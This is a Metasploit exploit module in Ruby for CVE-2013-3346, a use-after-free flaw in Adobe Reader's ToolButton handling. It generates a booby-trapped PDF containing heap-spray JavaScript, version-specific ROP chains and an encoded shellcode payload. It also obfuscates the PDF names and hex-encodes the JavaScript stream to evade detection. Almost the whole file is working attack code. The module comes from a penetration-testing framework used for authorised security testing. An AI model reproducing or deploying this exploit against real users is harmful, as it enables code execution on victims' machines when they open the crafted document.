##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::RopDb

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Adobe Reader ToolButton Use After Free',
      'Description'    => %q{
        This module exploits an use after free condition on Adobe Reader versions 11.0.2, 10.1.6
        and 9.5.4 and prior. The vulnerability exists while handling the ToolButton object, where
        the cEnable callback can be used to early free the object memory. Later use of the object
        allows triggering the use after free condition. This module has been tested successfully
        on Adobe Reader 11.0.2, 10.0.4 and 9.5.0 on Windows XP SP3, as exploited in the wild in
        November, 2013.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Soroush Dalili', # Vulnerability discovery
          'Unknown', # Exploit in the wild
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-3346' ],
          [ 'OSVDB', '96745' ],
          [ 'ZDI', '13-212' ],
          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb13-15.html' ],
          [ 'URL', 'http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/ms-windows-local-privilege-escalation-zero-day-in-the-wild.html' ]
        ],
      'Payload'        =>
        {
          'Space'    => 1024,
          'BadChars' => "\x00",
          'DisableNops' => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows XP / Adobe Reader 9/10/11', { }],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Aug 08 2013',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
      ], self.class)
  end

  def exploit
    js_data = make_js

    # Create the pdf
    pdf = make_pdf(js_data)

    print_status("Creating '#{datastore['FILENAME']}' file...")

    file_create(pdf)
  end


  def make_js

    # CreateFileMappingA + MapViewOfFile + memcpy rop chain
    rop_9 = Rex::Text.to_unescape(generate_rop_payload('reader', '', { 'target' => '9' }))
    rop_10 = Rex::Text.to_unescape(generate_rop_payload('reader', '', { 'target' => '10' }))
    rop_11 = Rex::Text.to_unescape(generate_rop_payload('reader', '', { 'target' => '11' }))
    escaped_payload = Rex::Text.to_unescape(payload.encoded)

    js = %Q|
function heapSpray(str, str_addr, r_addr) {
  var aaa = unescape("%u0c0c");
  aaa += aaa;
  while ((aaa.length + 24 + 4) < (0x8000 + 0x8000)) aaa += aaa;
  var i1 = r_addr - 0x24;
  var bbb = aaa.substring(0, i1 / 2);
  var sa = str_addr;
  while (sa.length < (0x0c0c - r_addr)) sa += sa;
  bbb += sa;
  bbb += aaa;
  var i11 = 0x0c0c - 0x24;
  bbb = bbb.substring(0, i11 / 2);
  bbb += str;
  bbb += aaa;
  var i2 = 0x4000 + 0xc000;
  var ccc = bbb.substring(0, i2 / 2);
  while (ccc.length < (0x40000 + 0x40000)) ccc += ccc;
  var i3 = (0x1020 - 0x08) / 2;
  var ddd = ccc.substring(0, 0x80000 - i3);
  var eee = new Array();
  for (i = 0; i < 0x1e0 + 0x10; i++) eee[i] = ddd + "s";
  return;
}
var shellcode = unescape("#{escaped_payload}");
var executable = "";
var rop9 = unescape("#{rop_9}");
var rop10 = unescape("#{rop_10}");
var rop11 = unescape("#{rop_11}");
var r11 = false;
var vulnerable = true;

var obj_size;
var rop;
var ret_addr;
var rop_addr;
var r_addr;

if (app.viewerVersion >= 9 && app.viewerVersion < 10 && app.viewerVersion <= 9.504) {
  obj_size = 0x330 + 0x1c;
  rop = rop9;
  ret_addr = unescape("%ua83e%u4a82");
  rop_addr = unescape("%u08e8%u0c0c");
  r_addr = 0x08e8;
} else if (app.viewerVersion >= 10 && app.viewerVersion < 11 && app.viewerVersion <= 10.106) {
  obj_size = 0x360 + 0x1c;
  rop = rop10;
  rop_addr = unescape("%u08e4%u0c0c");
  r_addr = 0x08e4;
  ret_addr = unescape("%ua8df%u4a82");
} else if (app.viewerVersion >= 11 && app.viewerVersion <= 11.002) {
  r11 = true;
  obj_size = 0x370;
  rop = rop11;
  rop_addr = unescape("%u08a8%u0c0c");
  r_addr = 0x08a8;
  ret_addr = unescape("%u8003%u4a84");
} else {
  vulnerable = false;
}

if (vulnerable) {
  var payload = rop + shellcode;
  heapSpray(payload, ret_addr, r_addr);

  var part1 = "";
  if (!r11) {
    for (i = 0; i < 0x1c / 2; i++) part1 += unescape("%u4141");
  }
  part1 += rop_addr;
  var part2 = "";
  var part2_len = obj_size - part1.length * 2;
  for (i = 0; i < part2_len / 2 - 1; i++) part2 += unescape("%u4141");
  var arr = new Array();

  removeButtonFunc = function () {
    app.removeToolButton({
        cName: "evil"
    });

    for (i = 0; i < 10; i++) arr[i] = part1.concat(part2);
  }

  addButtonFunc = function () {
    app.addToolButton({
      cName: "xxx",
      cExec: "1",
      cEnable: "removeButtonFunc();"
    });
  }

  app.addToolButton({
    cName: "evil",
    cExec: "1",
    cEnable: "addButtonFunc();"
  });
}
|

    js
  end

  def RandomNonASCIIString(count)
    result = ""
    count.times do
      result << (rand(128) + 128).chr
    end
    result
  end

  def ioDef(id)
    "%d 0 obj \n" % id
  end

  def ioRef(id)
    "%d 0 R" % id
  end


  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
  def nObfu(str)
    #return str
    result = ""
    str.scan(/./u) do |c|
      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
        result << "#%x" % c.unpack("C*")[0]
      else
        result << c
      end
    end
    result
  end


  def ASCIIHexWhitespaceEncode(str)
    result = ""
    whitespace = ""
    str.each_byte do |b|
      result << whitespace << "%02x" % b
      whitespace = " " * (rand(3) + 1)
    end
    result << ">"
  end


  def make_pdf(js)
    xref = []
    eol = "\n"
    endobj = "endobj" << eol

    # Randomize PDF version?
    pdf = "%PDF-1.5" << eol
    pdf << "%" << RandomNonASCIIString(4) << eol

    # catalog
    xref << pdf.length
    pdf << ioDef(1) << nObfu("<<") << eol
    pdf << nObfu("/Pages ") << ioRef(2) << eol
    pdf << nObfu("/Type /Catalog") << eol
    pdf << nObfu("/OpenAction ") << ioRef(4) << eol
    # The AcroForm is required to get icucnv36.dll / icucnv40.dll to load
    pdf << nObfu("/AcroForm ") << ioRef(6) << eol
    pdf << nObfu(">>") << eol
    pdf << endobj

    # pages array
    xref << pdf.length
    pdf << ioDef(2) << nObfu("<<") << eol
    pdf << nObfu("/Kids [") << ioRef(3) << "]" << eol
    pdf << nObfu("/Count 1") << eol
    pdf << nObfu("/Type /Pages") << eol
    pdf << nObfu(">>") << eol
    pdf << endobj

    # page 1
    xref << pdf.length
    pdf << ioDef(3) << nObfu("<<") << eol
    pdf << nObfu("/Parent ") << ioRef(2) << eol
    pdf << nObfu("/Type /Page") << eol
    pdf << nObfu(">>") << eol # end obj dict
    pdf << endobj

    # js action
    xref << pdf.length
    pdf << ioDef(4) << nObfu("<<")
    pdf << nObfu("/Type/Action/S/JavaScript/JS ") + ioRef(5)
    pdf << nObfu(">>") << eol
    pdf << endobj

    # js stream
    xref << pdf.length
    compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
    pdf << ioDef(5) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
    pdf << "stream" << eol
    pdf << compressed << eol
    pdf << "endstream" << eol
    pdf << endobj

    ###
    # The following form related data is required to get icucnv36.dll / icucnv40.dll to load
    ###

    # form object
    xref << pdf.length
    pdf << ioDef(6)
    pdf << nObfu("<</XFA ") << ioRef(7) << nObfu(">>") << eol
    pdf << endobj

    # form stream
    xfa = <<-EOF
<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/2.6/">
<present><pdf><interactive>1</interactive></pdf></present>
</config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
<subform name="form1" layout="tb" locale="en_US">
<pageSet></pageSet>
</subform></template></xdp:xdp>
EOF

    xref << pdf.length
    pdf << ioDef(7) << nObfu("<</Length %s>>" % xfa.length) << eol
    pdf << "stream" << eol
    pdf << xfa << eol
    pdf << "endstream" << eol
    pdf << endobj

    ###
    # end form stuff for icucnv36.dll / icucnv40.dll
    ###


    # trailing stuff
    xrefPosition = pdf.length
    pdf << "xref" << eol
    pdf << "0 %d" % (xref.length + 1) << eol
    pdf << "0000000000 65535 f" << eol
    xref.each do |index|
      pdf << "%010d 00000 n" % index << eol
    end

    pdf << "trailer" << eol
    pdf << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol

    pdf << "startxref" << eol
    pdf << xrefPosition.to_s() << eol

    pdf << "%%EOF" << eol
    pdf
  end

end
